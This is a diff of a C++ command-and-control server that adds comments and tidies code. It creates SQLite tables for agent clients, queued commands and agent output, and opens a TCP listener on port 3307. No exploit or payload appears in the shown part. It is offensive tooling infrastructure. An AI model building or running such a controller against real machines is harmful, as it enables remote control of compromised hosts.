@@ -6,25 +6,36 @@
 #include <unistd.h>
 #include <cstring>
 
-#define BUFFER_SIZE 1024//INSERT INTO CLIENTS(IPADDR, NETIPADDR, MAC, LAST_HELLO) VALUES ('1.1.1.1', '2.2.2.2', '11:22:33:44:55:66', 13)
+#define BUFFER_SIZE 1024
 #define SERVER_PORT 3307
 
+/**
+ * Function creates tables for C2 Database
+ * @param db_p Pointer to Database
+ */
 void create_tables(sqlite3 *db_p){
-    // Three tables
     std::vector<std::string> sql;
     char *err = 0;
-    // clients table for agents
     sqlite3_exec(db_p, "CREATE TABLE CLIENTS(ID INT PRIMARY KEY, IPADDR CHAR(15), NETIPADDR CHAR(15), MAC CHAR(17), LAST_HELLO INT)", 0, 0, &err);
     sqlite3_exec(db_p, "CREATE TABLE COMMANDS(ID INT PRIMARY KEY, COMMAND TEXT, CLIENT_ID INT)", 0, 0, &err);
     sqlite3_exec(db_p, "CREATE TABLE OUTPUT(ID INT PRIMARY KEY, IPADDR CHAR(15), NETIPADDR CHAR(15), MAC CHAR(17), OUT TEXT)", 0, 0, &err);
 }
 
+/**
+ * Function checks if parsed command is OK
+ * @param com String with SQL Statement
+ * @return True if command is bad
+ */
 bool badCommand(std::string &com){
     if (com.size() != 6)
         return true;
     return false;
 }
 
+/**
+ * Main function in program
+ * @return 0 if OK
+ */
 int main(){
     int serverSocket, clientSocket;
     struct sockaddr_in serverAddress, clientAddress;
@@ -40,14 +51,12 @@ int main(){
 
     create_tables(database_ptr);
 
-    // Creating serverSocket
     serverSocket = socket(AF_INET, SOCK_STREAM, 0);
     if (serverSocket < 0){
         std::cerr << "Серверный сокет не создан. Ошибка." << std::endl;
         return 1;
     }
 
-    // Binding serverSocket
     serverAddress.sin_family = AF_INET;
     serverAddress.sin_addr.s_addr = INADDR_ANY;
     serverAddress.sin_port = htons(SERVER_PORT);
@@ -56,7 +65,6 @@ int main(){
         return 2;
     }
 
-    // Listening for connections
     if (listen(serverSocket, 5) < 0){
         std::cerr << "Прослушивание не запущено. Ошибка." << std::endl;
         return 3;
